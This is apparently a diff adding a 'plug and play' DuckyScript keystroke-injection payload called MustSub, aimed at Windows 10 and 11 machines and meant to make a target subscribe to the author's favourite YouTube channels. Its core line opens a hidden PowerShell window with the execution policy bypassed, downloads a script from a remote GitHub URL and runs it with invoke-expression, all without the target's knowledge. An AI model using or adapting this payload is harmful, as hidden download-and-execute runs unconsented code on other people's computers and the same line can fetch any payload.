@@ -1,0 +1,16 @@
+REM     Title: MustSub
+
+REM     Author: I am Jakoby
+
+REM     Description: This payload is used to get your target to subscribe to 15 of my favorite hacker youtube channels
+
+REM     Target: Windows 10, 11
+
+REM     --------------------------------------------------------------------------------------
+REM     THIS PAYLOAD IS PLUG AND PLAY. NO MODIFICATIONS NEEDED SIMPLY RUN THE CODE DOWN BELOW.
+REM     --------------------------------------------------------------------------------------
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-MustSub/MustSub.ps1?dl=1; invoke-expression $pl
+ENTER
